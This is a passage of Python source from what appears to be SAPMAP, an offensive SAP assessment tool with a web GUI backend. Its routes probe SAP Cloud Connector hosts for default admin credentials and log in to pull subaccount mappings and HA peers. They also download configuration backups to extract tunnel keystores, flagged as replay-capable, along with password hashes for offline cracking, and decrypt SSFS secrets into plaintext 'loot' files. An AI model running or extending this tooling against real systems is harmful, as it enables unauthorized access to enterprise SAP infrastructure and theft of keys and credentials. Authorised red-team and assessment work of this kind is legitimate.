            cursor = int(request.params.get("cursor", 0))
        except (TypeError, ValueError):
            cursor = 0
        return json.dumps(sapmap_findings.get_since(cursor))

    @app.route("/api/findings/clear", method="POST")
    def clear_findings():
        response.content_type = "application/json"
        sapmap_findings.clear()
        return json.dumps({"status": "ok"})

    # --- MITRE ATT&CK ---------------------------------------------------
    @app.route("/api/attack/catalog")
    def attack_catalog():
        """Return the pinned ATT&CK catalog used by the GUI to resolve
        technique IDs into human labels and tactic groupings.  The GUI
        fetches this once at boot and caches it on mapState."""
        response.content_type = "application/json"
        from sapmap_attack import (
            TACTICS, TECHNIQUES, TACTIC_ORDER, ATTACK_VERSION, lookup,
        )
        techs = {tid: lookup(tid) for tid in TECHNIQUES}
        return json.dumps({
            "version": ATTACK_VERSION,
            "tactics": dict(TACTICS),
            "tactic_order": list(TACTIC_ORDER),
            "techniques": techs,
        })

    @app.route("/api/attack/heatmap")
    def attack_heatmap():
        """Coverage matrix for the in-GUI heatmap modal."""
        response.content_type = "application/json"
        from sapmap_attack import heatmap_grid
        return json.dumps(heatmap_grid(api.state))

    @app.route("/api/attack/navigator_layer")
    def attack_navigator_layer():
        """Return the MITRE ATT&CK Navigator v4.5 layer JSON inline.
        Used by direct fetch / curl; the GUI uses /save_navigator_layer
        instead because pywebview renders attachment content inline."""
        from sapmap_attack import to_navigator_layer
        nodes_count = len(getattr(api.state, "nodes", {}))
        name = f"SAPMAP engagement ({nodes_count} SAP node"
        name += "s)" if nodes_count != 1 else ")"
        layer = to_navigator_layer(api.state, name=name)
        response.content_type = "application/json"
        response.headers["Content-Disposition"] = (
            f'attachment; filename="sapmap_attack_layer.json"')
        return json.dumps(layer, indent=2)

    @app.route("/api/attack/save_navigator_layer", method="POST")
    def attack_save_navigator_layer():
        """Write the Navigator layer JSON to loot/reports/ and return
        the absolute path.  Used by the in-GUI 'Download Navigator
        layer' button because pywebview's webview renders attachment
        Content-Disposition responses inline instead of triggering a
        download dialog."""
        response.content_type = "application/json"
        try:
            from sapmap_attack import to_navigator_layer
            from datetime import datetime
            nodes_count = len(getattr(api.state, "nodes", {}))
            name = f"SAPMAP engagement ({nodes_count} SAP node"
            name += "s)" if nodes_count != 1 else ")"
            layer = to_navigator_layer(api.state, name=name)
            reports_dir = state_mgr.ensure_loot_dir("reports")
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"sapmap_attack_layer_{ts}.json"
            path = os.path.join(reports_dir, filename)
            with open(path, "w", encoding="utf-8") as fh:
                json.dump(layer, fh, indent=2)
            return json.dumps({
                "status":   "ok",
                "path":     path,
                "filename": filename,
                "techniques": len(layer.get("techniques", [])),
            })
        except Exception as e:
            return json.dumps({"status": "error", "error": str(e)})

    # -- UI commands (script → frontend) --
    @app.route("/api/ui/commands")
    def get_ui_commands():
        response.content_type = "application/json"
        with _ui_cmd_lock:
            cmds = list(_ui_commands)
            _ui_commands.clear()
        return json.dumps(cmds)

    # -- State --
    @app.route("/api/state")
    def get_state():
        response.content_type = "application/json"
        return json.dumps(api.get_state_dict(), default=str)

    # -- Scan control --
    @app.route("/api/scan/start", method="POST")
    def scan_start():
        response.content_type = "application/json"
        config = request.json or {}
        return json.dumps(api.start_scan(config))

    @app.route("/api/scan/stop", method="POST")
    def scan_stop():
        response.content_type = "application/json"
        return json.dumps(api.stop_scan())

    # -- SCC (Cloud Connector) on-demand actions --
    @app.route("/api/scc/<host>/probe_creds", method="POST")
    def scc_probe_creds(host):
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})

        def _run():
            _task_start(f"scc:{host}:probe_creds", f"SCC {host}: probing default creds")
            try:
                from sapmap_scc_admin import probe_default_creds, logout
                live, sess, attempts = probe_default_creds(
                    host, port=sn.admin_ui_port or 8443, timeout=8.0,
                )
                if live and sess:
                    sn.default_creds_live = True
                    sn.admin_session_obtained = True
                    sn.pwned = True
                    if sess.version:
                        sn.version = sess.version
                        sn.version_source = "api"
                    sapmap_findings.emit_finding(
                        "CRITICAL", host,
                        f"SCC default credentials live: {sess.user}/manage",
                        ref="scc.default.creds.live",
                        attack_capability="creds.default_probe")
                    logout(sess)
                else:
                    tried = ", ".join(a["user"] for a in attempts) or "none"
                    sapmap_findings.emit_finding(
                        "HIGH", host,
                        f"SCC default-cred probe ran (rejected): tried {tried}",
                        ref="scc.default.creds.absent.but.probed")
            except Exception as e:
                print(f"[-] SCC {host}: probe failed: {e}")
            finally:
                _task_end(f"scc:{host}:probe_creds")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/pull_mappings", method="POST")
    def scc_pull_mappings(host):
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        user = data.get("username", "")
        pwd = data.get("password", "")
        if not user or not pwd:
            return json.dumps({"error": "username + password required"})

        def _run():
            _task_start(f"scc:{host}:pull_mappings", f"SCC {host}: pulling mappings")
            try:
                from sapmap_scc_admin import login, pull_subaccounts, pull_mappings, pull_ha_state, logout
                sess = login(host, user, pwd, port=sn.admin_ui_port or 8443, timeout=10.0)
                if not sess:
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC mapping pull: login failed for {user}",
                        ref="scc.admin.login.failed")
                    return
                sn.admin_session_obtained = True
                sn.pwned = True
                # Cache verified Administrator credentials on the SCC node so
                # subsequent map actions (e.g. tunnel-relay tests) can reuse
                # them without prompting again.
                from sapmap_models import Credentials
                already = any(getattr(c, "username", "") == user
                              for c in (sn.credentials or []))
                if not already:
                    sn.credentials.append(Credentials(
                        username=user, password=pwd, verified=True,
                    ))
                sapmap_findings.emit_finding(
                    "CRITICAL", host,
                    f"SCC admin credentials verified: {user} — full Cloud "
                    f"Connector configuration access (mappings, channels, "
                    f"trust store, principal-propagation CA).",
                    ref="scc.admin.creds.verified",
                    meta={"user": user})
                if sess.version:
                    sn.version = sess.version
                    sn.version_source = "api"
                # Re-score CVE buckets now that we have an authoritative
                # version (and possibly an updated bundle hash).  The
                # initial scanner pass uses the favicon/bundle-derived
                # version which is sometimes coarser; the API banner is
                # exact, so suspected entries can sharpen.
                try:
                    from sapmap_scc_cve_buckets import score as _cve_score
                    res = _cve_score(sn.version or "", sn.bundle_hash or "")
                    prev_conf = set(sn.cves_confirmed or [])
                    prev_susp = set(sn.cves_suspected or [])
                    sn.cves_confirmed = list(res["confirmed"])
                    sn.cves_suspected = list(res["suspected"])
                    sn.cve_details = list(res["details"])
                    new_conf = set(sn.cves_confirmed) - prev_conf
                    new_susp = set(sn.cves_suspected) - prev_susp
                    for c in res["details"]:
                        cve = c["cve"]
                        if cve in new_conf:
                            sapmap_findings.emit_finding(
                                c["severity"], host,
                                f"SCC {sn.version} [CONFIRMED via bundle hash]: "
                                f"{c['headline']}",
                                cve=cve, ref=c.get("ref", ""))
                        elif cve in new_susp:
                            sapmap_findings.emit_finding(
                                c["severity"], host,
                                f"SCC {sn.version} [suspected]: {c['headline']}",
                                cve=cve, ref=c.get("ref", ""))
                except Exception as e:
                    print(f"[-] SCC {host}: CVE re-score failed: {e}")
                # HA pair detection — populate ha_role / ha_shadow_host on
                # the node and register the peer as a sibling SCC so it
                # plots on the map with a shadow link.
                ha = pull_ha_state(sess, timeout=8.0) or {}
                if ha:
                    sn.ha_role = ha.get("role", "") or ""
                    sn.ha_peer_role = ha.get("peer_role", "") or ""
                    peer_host = ha.get("peer_host", "") or ""
                    sn.ha_shadow_host = peer_host
                    if peer_host:
                        sapmap_findings.emit_finding(
                            "MEDIUM", host,
                            f"SCC HA pair detected: {sn.ha_role or '?'} ↔ "
                            f"{ha.get('peer_role') or '?'} {peer_host}. "
                            f"Compromise of either node yields the same "
                            f"tunnel privkey + PP CA — both must be patched.",
                            ref="scc.ha.pair",
                            meta={"role": sn.ha_role,
                                  "peer_role": ha.get("peer_role"),
                                  "peer_host": peer_host})
                        # Register the peer as its own SCCNode so the
                        # front-end draws it.  Don't overwrite an existing
                        # entry — the peer may already have been scanned.
                        if peer_host not in api.state.scc_nodes:
                            from sapmap_models import SCCNode
                            api.state.scc_nodes[peer_host] = SCCNode(
                                host=peer_host,
                                ip=peer_host,
                                admin_ui_port=sn.admin_ui_port or 8443,
                                ha_role=ha.get("peer_role", "") or "",
                                ha_peer_role=sn.ha_role,
                                ha_shadow_host=host,
                                tunnel_region=sn.tunnel_region,
                                notes=f"Discovered as HA peer of {host}",
                            )
                        else:
                            peer_node = api.state.scc_nodes[peer_host]
                            if not peer_node.ha_shadow_host:
                                peer_node.ha_shadow_host = host
                            if not peer_node.ha_role:
                                peer_node.ha_role = ha.get("peer_role", "") or ""
                            if not peer_node.ha_peer_role:
                                peer_node.ha_peer_role = sn.ha_role
                    else:
                        # Dump every endpoint we tried (status + body
                        # prefix) so we can spot which URL exposes the
                        # shadowHost / masterHost on this SCC build.
                        try:
                            print(f"[i] SCC {host}: HA raw payload = "
                                  f"{json.dumps(ha.get('raw', {}), default=str)[:1500]}")
                        except Exception:
                            print(f"[i] SCC {host}: HA raw payload "
                                  f"(unprintable): {ha.get('raw')}")
                        for plog in (ha.get("probe_log") or []):
                            try:
                                pth, st, bp = plog
                                print(f"[i] SCC {host}: HA probe "
                                      f"{pth} -> HTTP {st}  body={bp!r}")
                            except Exception:
                                pass
                        # role=shadow on its own already proves HA — no
                        # standalone connector ever reports as shadow.
                        if (sn.ha_role or "").lower() == "shadow":
                            sapmap_findings.emit_finding(
                                "MEDIUM", host,
                                f"SCC HA: this connector is a SHADOW — "
                                f"its master peer host could not be "
                                f"located via the REST API.  Pull "
                                f"backup to recover masterHost from "
                                f"scc_config.ini.",
                                ref="scc.ha.shadow.no_peer",
                                meta={"role": sn.ha_role,
                                      "raw": ha.get("raw", {})})
                        else:
                            sapmap_findings.emit_finding(
                                "INFO", host,
                                f"SCC HA: standalone (role={sn.ha_role or '?'}, "
                                f"no shadow configured).",
                                ref="scc.ha.standalone",
                                meta={"role": sn.ha_role,
                                      "raw": ha.get("raw", {})})
                subs = pull_subaccounts(sess, timeout=10.0) or []
                all_maps = []
                uuids = []
                for s in subs:
                    if not isinstance(s, dict):
                        continue
                    uuid = s.get("subaccount") or s.get("subaccountId") or s.get("uuid") or ""
                    if uuid:
                        uuids.append(uuid)
                        m = pull_mappings(sess, uuid, timeout=10.0) or []
                        all_maps.extend(m)
                    region = s.get("region") or s.get("regionHost") or ""
                    if region and region not in (sn.tunnel_region or ""):
                        sn.tunnel_region = region
                _apply_mappings_to_state(host, sn, all_maps, uuids)
                logout(sess)
            except Exception as e:
                print(f"[-] SCC {host}: mapping pull failed: {e}")
            finally:
                _task_end(f"scc:{host}:pull_mappings")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    def _apply_mappings_to_state(host, sn, all_maps, uuids):
        """Persist mappings on the SCC node, rebuild scc_links across all
        SAP nodes, and emit per-mapping risk findings.  Shared between
        live admin pull and offline backup-zip parse."""
        sn.subaccount_uuids = list(dict.fromkeys(uuids))
        sn.mappings = all_maps
        sn.principal_propagation_enabled = any(
            m.get("principal_propagation") for m in all_maps)
        # Probe every mapping upfront so the front-end edge color logic
        # sees uniform `reachable` data across all mappings to a given
        # backend.  Without this, only the placeholder-trigger mapping
        # would be probed, and a later manual Probe Mappings sweep could
        # leave one mapping reachable=true and a sibling reachable=false
        # → red edge instead of green.
        from sapmap_scc_relay import probe_mapping
        for m in all_maps:
            if not isinstance(m, dict):
                continue
            try:
                probe_mapping(m, timeout=3.0)
            except Exception:
                pass
        for n in api.state.nodes.values():
            if n.scc_links and host in n.scc_links:
                n.scc_links = [h for h in n.scc_links if h != host]
        sapmap_findings.emit_finding(
            "HIGH", host,
            f"SCC mappings extracted: {len(all_maps)} mapping(s), "
            f"{len(uuids)} subaccount(s)",
            ref="scc.mappings.extracted",
            meta={"subaccounts": len(uuids), "mappings": len(all_maps)})
        for m in all_maps:
            label = (f"{m.get('virtual_host','?')}:{m.get('virtual_port',0)} "
                     f"-> {m.get('internal_host','?')}:{m.get('internal_port',0)}")
            sid_label = m.get("sid") or "?"
            proto = (m.get("protocol") or "").upper()
            auth = m.get("authentication_mode") or ""
            bt = m.get("backend_type") or ""
            if auth in ("KERBEROS", "X509_GENERAL"):
                sapmap_findings.emit_finding(
                    "HIGH", host,
                    f"SCC mapping {label} [{sid_label}/{proto}] "
                    f"uses {auth} principal propagation — backend trusts "
                    f"any user the SCC asserts.",
                    ref="scc.mapping.principal_propagation",
                    meta={"mapping": label, "auth": auth,
                          "sid": sid_label, "backend_type": bt})
            for r in (m.get("path_allowlist") or []):
                if not isinstance(r, dict):
                    continue
                rpath = (r.get("path") or "").strip()
                rpolicy = (r.get("policy") or "").upper()
                if not r.get("enabled", True):
                    continue
                is_subpath_match = (rpolicy == "PATH_AND_ALL_SUB_PATHS"
                                    or (not r.get("exact_match_only", True)))
                if rpath == "/":
                    sapmap_findings.emit_finding(
                        "HIGH", host,
                        f"SCC mapping {label} [{sid_label}] exposes "
                        f"path '/' (full backend) to subaccount "
                        f"{m.get('virtual_host','?')}.",
                        ref="scc.mapping.path.root",
                        meta={"mapping": label, "path": rpath, "sid": sid_label})
                elif rpath in ("/sap/", "/sap") and is_subpath_match:
                    sapmap_findings.emit_finding(
                        "MEDIUM", host,
                        f"SCC mapping {label} [{sid_label}] allows "
                        f"'/sap/' and all sub-paths — entire ABAP "
                        f"namespace is reachable through the tunnel.",
                        ref="scc.mapping.path.sap_namespace",
                        meta={"mapping": label, "path": rpath, "sid": sid_label})
            msid = (m.get("sid") or "").strip().upper()
            ihost = m.get("internal_host") or ""
            iport = int(m.get("internal_port") or 0)
            matched_node = None
            for n in api.state.nodes.values():
                match = False
                if msid:
                    match = (n.sid or "").upper() == msid
                elif ihost:
                    match = (n.hostname == ihost or n.ip == ihost)
                if match:
                    matched_node = n
                    break
            if matched_node is None and (msid or ihost):
                # Backend isn't on the map yet — only synthesize a
                # placeholder if the upfront smoke-test confirmed the
                # target is reachable.  Avoids cluttering the map with
                # dead / typo'd / decommissioned mappings.
                if not m.get("reachable"):
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC mapping {ihost}:{iport} [{msid or '?'}] "
                        f"unreachable on smoke test — not adding to map "
                        f"({m.get('probe_error') or 'no response'}).",
                        ref="scc.mapping.discovered.unreachable",
                        meta={"host": ihost, "port": iport, "sid": msid,
                              "error": m.get("probe_error")})
                    continue
                # SID precedence: mapping.sid > EXT_<ihost>_<iport>.
                # Mirrors the UNK_/ACL_ pattern used by the scanner.
                is_ip = (ihost.count(".") == 3
                         and all(p.isdigit() for p in ihost.split(".")))
                if msid and msid not in api.state.nodes:
                    new_sid = msid
                else:
                    slug = (ihost or "unknown").replace(".", "_").replace(":", "_")
                    new_sid = (f"EXT_{slug}_{iport}" if iport
                               else f"EXT_{slug}")
                if new_sid in api.state.nodes:
                    matched_node = api.state.nodes[new_sid]
                else:
                    sys_type = {
                        "abapSys": "ABAP",
                        "javaSys": "JAVA",
                        "abapJavaSys": "ABAP+JAVA",
                        "hanaDB": "HANA",
                    }.get(m.get("backend_type", ""), "")
                    placeholder = SAPNode(
                        sid=new_sid,
                        ip=ihost if is_ip else "",
                        hostname="" if is_ip else ihost,
                        system_type=sys_type,
                    )
                    api.state.add_node(placeholder)
                    matched_node = placeholder
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC mapping discovered new on-prem backend "
                        f"{ihost}:{iport} [{new_sid}] — reachable on smoke "
                        f"test ({m.get('probe_latency_ms', 0)}ms"
                        f"{(' · ' + m['probe_signature']) if m.get('probe_signature') else ''})"
                        f" — added to map.",
                        ref="scc.mapping.discovered.node",
                        meta={"sid": new_sid, "host": ihost, "port": iport,
                              "backend_type": m.get("backend_type", ""),
                              "auth": m.get("authentication_mode", ""),
                              "latency_ms": m.get("probe_latency_ms", 0),
                              "signature": m.get("probe_signature", "")})
            if matched_node and host not in matched_node.scc_links:
                matched_node.scc_links.append(host)

    def _apply_ssfs_decrypt_result(host, sn, res):
        """Update SCC node state + emit findings from a decrypt_and_unlock
        result.  Shared between extract_keystore (auto-chain) and
        decrypt_ssfs (manual JNI fallback)."""
        if not res.get("ok"):
            sapmap_findings.emit_finding(
                "INFO", host,
                f"SCC SSFS decryption failed: {res.get('error','?')}",
                ref="scc.ssfs.decrypt.failed",
                meta={"error": res.get("error")})
            return
        sn.ssfs_decrypted = True
        sn.ssfs_secrets_path = res.get("secrets_path", "")
        sn.ssfs_secrets_keys = list(res.get("secrets_keys", []))
        sn.unlocked_keystores = list(res.get("keystores", []))
        for k in sn.unlocked_keystores:
            p = (k.get("path") or "")
            sha = k.get("cert_sha256") or ""
            if p == "scc_config/scc.p12" and sha:
                sn.tunnel_privkey_fp = sha
        for k in sn.unlocked_keystores:
            subj = (k.get("cert_subject") or "").lower()
            extras = " ".join(k.get("extra_subjects") or []).lower()
            if "principal" in subj or "principal" in extras:
                if k.get("cert_sha256"):
                    sn.pp_ca_privkey_fp = k["cert_sha256"]
                    break
        key_names = ", ".join(sn.ssfs_secrets_keys) or "(none)"
        # Skip the finding when 0 secrets were recovered — this happens
        # with backup-zip SSFS (double-encrypted by backup process) and
        # produces a misleading CRITICAL before the real result arrives
        # from the on-host decrypt path.
        if sn.ssfs_secrets_keys:
            sapmap_findings.emit_finding(
                "CRITICAL", host,
                f"SCC SSFS decrypted: {len(sn.ssfs_secrets_keys)} secret(s) "
                f"recovered [{key_names}].  Plaintext side-file "
                f"{sn.ssfs_secrets_path} (mode 0600).",
                ref="scc.ssfs.decrypted",
                meta={"secrets_path": sn.ssfs_secrets_path,
                      "keys": list(sn.ssfs_secrets_keys),
                      "native_lib": res.get("native_lib", "")})
        else:
            print(f"[*] SCC {host}: SSFS decrypt yielded 0 secrets "
                  f"(backup zip is double-encrypted — use 'Decrypt On-Host "
                  f"SSFS' from a co-located pwned SAP node)")
        for k in sn.unlocked_keystores:
            if k.get("error"):
                continue
            subj = k.get("cert_subject") or "(no cert)"
            sha = (k.get("cert_sha256") or "")[:16]
            sapmap_findings.emit_finding(
                "CRITICAL", host,
                f"SCC keystore unlocked: {k.get('path','?')} — "
                f"subject={subj} cert_sha256={sha}…  "
                f"{k.get('key_type','?')}/{k.get('key_size','?')} key.",
                ref="scc.ssfs.keystore.unlocked",
                meta={"path": k.get("path"),
                      "cert_subject": subj,
                      "cert_sha256": k.get("cert_sha256"),
                      "key_type": k.get("key_type"),
                      "key_size": k.get("key_size"),
                      "valid_until": k.get("cert_not_after")})
        for kn in sn.ssfs_secrets_keys:
            if kn == "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD":
                continue
            sapmap_findings.emit_finding(
                "HIGH", host,
                f"SCC SSFS secret recovered: {kn} — see "
                f"{sn.ssfs_secrets_path} for plaintext.",
                ref="scc.ssfs.secret.recovered",
                meta={"key": kn,
                      "secrets_path": sn.ssfs_secrets_path})

    @app.route("/api/scc/<host>/extract_keystore", method="POST")
    def scc_extract_keystore(host):
        """Pull the full SCC configuration backup and parse out the
        per-subaccount tunnel keystores + system keystore + SSFS blob.
        Drops the loot zip under ./loot/scc/<host>/ with mode 0600."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        user = data.get("username", "")
        pwd = data.get("password", "")
        backup_pwd = data.get("backup_password", "") or pwd
        if not user or not pwd:
            return json.dumps({"error": "username + password required"})
        if not backup_pwd:
            return json.dumps({"error": "backup_password required"})

        def _run():
            _task_start(f"scc:{host}:extract_keystore",
                        f"SCC {host}: pulling backup + parsing keystores")
            try:
                from sapmap_scc_keystore import extract_keystore
                res = extract_keystore(
                    host, user, pwd,
                    backup_password=backup_pwd,
                    port=sn.admin_ui_port or 8443,
                    timeout=30.0)
                if not res.get("ok"):
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC keystore extraction failed: "
                        f"{res.get('error', 'unknown error')}",
                        ref="scc.keystore.extract.failed",
                        meta={"error": res.get("error")})
                    return
                # Authenticated admin login implies pwned (same status the
                # pull_mappings flow flips); set if not already.
                sn.admin_session_obtained = True
                sn.pwned = True
                from sapmap_models import Credentials
                if not any(getattr(c, "username", "") == user
                           for c in (sn.credentials or [])):
                    sn.credentials.append(Credentials(
                        username=user, password=pwd, verified=True))
                sn.keystore_extracted = True
                sn.keystore_loot_path = res.get("loot_path", "")
                # Store backup password in-memory for future decryption attempts
                bpw = data.get("backup_password", "") or data.get("password", "")
                if bpw:
                    sn.backup_password = bpw

                # Try to decrypt config/users.xml from the backup zip now
                # (succeeds once option-3 cipher RE is done and wired in)
                if sn.keystore_loot_path and bpw:
                    try:
                        from sapmap_scc_keystore import try_decrypt_users_xml
                        loot_dir = os.path.dirname(sn.keystore_loot_path)
                        cached = try_decrypt_users_xml(
                            sn.keystore_loot_path, bpw, loot_dir)
                        if cached:
                            sn.users_xml_loot_path = cached
                            print(f"[+] SCC {host}: users.xml decrypted and cached at {cached}")
                        else:
                            print(f"[*] SCC {host}: users.xml backup cipher not yet cracked "
                                  f"(option-3 backlog) — backup_password stored for later")
                    except Exception as ue:
                        print(f"[-] SCC {host}: users.xml decrypt attempt error: {ue}")

                sys_ks = res.get("system_keystore") or {}
                tun_ks = res.get("tunnel_keystores") or []
                # tunnel_privkey_fp = SHA-256 of the system identity p12;
                # the per-subaccount fingerprints are surfaced in findings.
                if sys_ks.get("sha256"):
                    sn.tunnel_privkey_fp = sys_ks["sha256"]
                # pp_ca_privkey_fp: SAP stores the PP CA private key
                # inside the SSFS blob (SSFS_SCC.KEY/.DAT).  We fingerprint
                # those bytes so cross-session tracking still works
                # without unlocking the SSFS.
                if res.get("ssfs_present"):
                    # Re-read the zip to get the SSFS contents and hash.
                    try:
                        import io as _io, zipfile as _zf, hashlib as _h
                        with open(sn.keystore_loot_path, "rb") as fh:
                            blob = fh.read()
                        z = _zf.ZipFile(_io.BytesIO(blob))
                        h = _h.sha256()
                        for nm in ("scc_config/SSFS_SCC.KEY",
                                   "scc_config/SSFS_SCC.DAT"):
                            try:
                                h.update(z.read(nm))
                            except KeyError:
                                pass
                        sn.pp_ca_privkey_fp = h.hexdigest()
                    except Exception:
                        sn.pp_ca_privkey_fp = ""
                sapmap_findings.emit_finding(
                    "CRITICAL", host,
                    f"SCC keystore looted: backup zip ({res.get('loot_size',0)} B) "
                    f"saved to {sn.keystore_loot_path}. "
                    f"{len(tun_ks)} subaccount tunnel keystore(s) extracted, "
                    f"system identity keystore extracted"
                    f"{', SSFS (PP CA private key) present' if res.get('ssfs_present') else ''}.",
                    ref="scc.keystore.extracted",
                    meta={"loot_path": sn.keystore_loot_path,
                          "system_p12_sha256": sys_ks.get("sha256"),
                          "tunnel_count": len(tun_ks),
                          "ssfs": res.get("ssfs_present"),
                          "users_xml": res.get("users_xml_present")})
                # Per-subaccount finding so the operator sees every
                # tunnel cert they now own.
                for k in tun_ks:
                    sapmap_findings.emit_finding(
                        "CRITICAL", host,
                        f"SCC tunnel client keystore for subaccount "
                        f"{k['subaccount']} ({k['region']}) "
                        f"sha256={k['sha256'][:16]}… — replay-capable.",
                        ref="scc.keystore.tunnel.subaccount",
                        meta={"subaccount": k["subaccount"],
                              "region": k["region"],
                              "sha256": k["sha256"],
                              "path_in_zip": k["path"]})
                if res.get("users_xml_present"):
                    sapmap_findings.emit_finding(
                        "HIGH", host,
                        f"SCC config/users.xml extracted "
                        f"(sha256={res.get('users_xml_sha256','')[:16]}…) — "
                        f"hashed local user passwords available for offline crack.",
                        ref="scc.keystore.users.xml",
                        meta={"users_xml_sha256": res.get("users_xml_sha256")})
                # Sharpen version from manifest if available.
                man_v = (res.get("manifest") or {}).get("version") or ""
                if man_v and not sn.version:
                    sn.version = man_v
                    sn.version_source = "backup-manifest"
                # Auto-map: parse cloud→on-prem mappings straight out of
                # the backup zip (backends.xml per subaccount) so the
                # operator gets the same map plot as the live "Pull
                # Mappings" action without a second admin call.  Skip
                # when sn.mappings is already populated by a recent live
                # pull — avoid duplicate findings.
                if not sn.mappings:
                    try:
                        from sapmap_scc_keystore import parse_mappings_from_zip
                        mres = parse_mappings_from_zip(sn.keystore_loot_path)
                        if mres.get("ok"):
                            for region in (mres.get("regions") or []):
                                if region and region not in (sn.tunnel_region or ""):
                                    sn.tunnel_region = region
                            _apply_mappings_to_state(
                                host, sn,
                                mres.get("mappings") or [],
                                mres.get("subaccount_uuids") or [])
                        else:
                            print(f"[-] SCC {host}: offline mapping parse: "
                                  f"{mres.get('error')}")
                    except Exception as me:
                        print(f"[-] SCC {host}: offline mapping parse failed: {me}")
                # Auto-HA: scc_config.ini in the backup carries the full
                # HA state (haRole / isShadowEnabled / isHaActive /
                # shadowHost / masterHost), which the REST API doesn't
                # expose on most builds.  Parse it here so the violet
                # master↔shadow link gets drawn after a backup pull.
                try:
                    from sapmap_scc_keystore import parse_ha_state_from_zip
                    hres = parse_ha_state_from_zip(sn.keystore_loot_path)
                    if hres.get("ok"):
                        sn.ha_role = hres.get("role", "") or sn.ha_role
                        peer = hres.get("peer_host", "") or ""
                        peer_role = hres.get("peer_role", "") or ""
                        is_active = hres.get("is_ha_active", False)
                        is_enabled = hres.get("is_shadow_enabled", False)
                        if peer:
                            sn.ha_shadow_host = peer
                            sn.ha_peer_role = peer_role
                            sapmap_findings.emit_finding(
                                "MEDIUM", host,
                                f"SCC HA pair detected (from backup): "
                                f"{sn.ha_role or '?'} ↔ {peer_role or '?'} "
                                f"{peer} (active={is_active}, "
                                f"shadow_enabled={is_enabled}). "
                                f"Compromise of either node yields the "
                                f"same tunnel privkey + PP CA — both "
                                f"must be patched.",
                                ref="scc.ha.pair.backup",
                                meta={"role": sn.ha_role,
                                      "peer_role": peer_role,
                                      "peer_host": peer,
                                      "is_ha_active": is_active,
                                      "is_shadow_enabled": is_enabled})
                            if peer not in api.state.scc_nodes:
                                from sapmap_models import SCCNode
                                api.state.scc_nodes[peer] = SCCNode(
                                    host=peer,
                                    ip=peer,
                                    admin_ui_port=sn.admin_ui_port or 8443,
                                    ha_role=peer_role,
                                    ha_peer_role=sn.ha_role,
                                    ha_shadow_host=host,
                                    tunnel_region=sn.tunnel_region,
                                    notes=f"Discovered as HA peer of {host}",
                                )
                            else:
                                pn = api.state.scc_nodes[peer]
                                if not pn.ha_shadow_host:
                                    pn.ha_shadow_host = host
                                if not pn.ha_role:
                                    pn.ha_role = peer_role
                                if not pn.ha_peer_role:
                                    pn.ha_peer_role = sn.ha_role
                    else:
                        print(f"[-] SCC {host}: HA-from-zip parse: "
                              f"{hres.get('error')}")
                except Exception as he:
                    print(f"[-] SCC {host}: HA-from-zip parse failed: {he}")
                # Auto-analyse: read scc_config.ini's
                # <principalPropagationConfiguration> + every
                # trustcfg_<uuid>.xml from the backup zip and run
                # static rules over them (sapmap_scc_pp_analyzer).
                # Findings emitted directly into the bus so they show
                # up in the banner / drawer alongside the keystore-
                # extracted findings.
                try:
                    from sapmap_scc_keystore import (
                        parse_pp_config_from_zip, parse_pp_trust_from_zip,
                    )
                    from sapmap_scc_pp_analyzer import analyze_backup
                    pp = parse_pp_config_from_zip(sn.keystore_loot_path)
                    trust = parse_pp_trust_from_zip(sn.keystore_loot_path)
                    bundle = analyze_backup(pp, trust, mappings=sn.mappings)
                    sn.pp_analysis = bundle
                    sn.pp_analysis_at = bundle.get("analyzed_at", "")
                    crit = bundle["summary"].get("critical", 0)
                    high = bundle["summary"].get("high", 0)
                    sn.pp_weak_count = crit + high
                    for f in bundle["findings"]:
                        sapmap_findings.emit_finding(
                            f["severity"], host,
                            f["headline"]
                            + " — "
                            + f.get("recommendation", ""),
                            ref=f["ref"],
                            meta={"why": f.get("why", []),
                                  "raw": f.get("raw", {})})
                    print(f"[*] SCC {host}: PP analyser — "
                          f"{crit} CRITICAL, {high} HIGH, "
                          f"{bundle['summary'].get('medium', 0)} MEDIUM")
                except Exception as ae:
                    print(f"[-] SCC {host}: PP analyser failed: {ae}")
                # Auto-decrypt: pure-Python decryptor has no extra
                # dependency cost, so chain decrypt+unlock immediately
                # whenever the backup contains an SSFS blob.
                if res.get("ssfs_present"):
                    try:
                        from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
                        d = decrypt_and_unlock(sn.keystore_loot_path)
                        _apply_ssfs_decrypt_result(host, sn, d)
                        # The backup zip SSFS is double-encrypted by the
                        # backup process, so decrypt_and_unlock always
                        # returns 0 secrets from a zip.  If we got 0,
                        # check loot dir for on-host KEY+DAT files (written
                        # by harvest_scc_ssfs or Bundle 4 exfil) and retry.
                        if not sn.ssfs_secrets_keys:
                            host_slug = host.replace(":", "_").replace("/","_")
                            loot_dir = os.path.join("loot", "scc", host_slug)
                            key_path = os.path.join(loot_dir, "SSFS_SCC.KEY")
                            dat_path = os.path.join(loot_dir, "SSFS_SCC.DAT")
                            if os.path.isfile(key_path) and os.path.isfile(dat_path):
                                print(f"[*] SCC {host}: backup SSFS gave 0 secrets "
                                      f"— retrying with on-host files from loot/")
                                from sapmap_scc_ssfs_decrypt import (
                                    decrypt_ssfs_from_raw_bytes)
                                kdata = open(key_path, "rb").read()
                                ddata = open(dat_path, "rb").read()
                                d2 = decrypt_ssfs_from_raw_bytes(kdata, ddata)
                                if d2.get("ok") and d2.get("secrets"):
                                    # Build a fake decrypt result
                                    secrets = d2["secrets"]
                                    sp = os.path.join(
                                        loot_dir, "ssfs_secrets_onhost.txt")
                                    with open(sp, "w") as _f:
                                        for k, v in secrets.items():
                                            _f.write(f"{k} = {v}\n")
                                    os.chmod(sp, 0o600)
                                    _apply_ssfs_decrypt_result(
                                        host, sn,
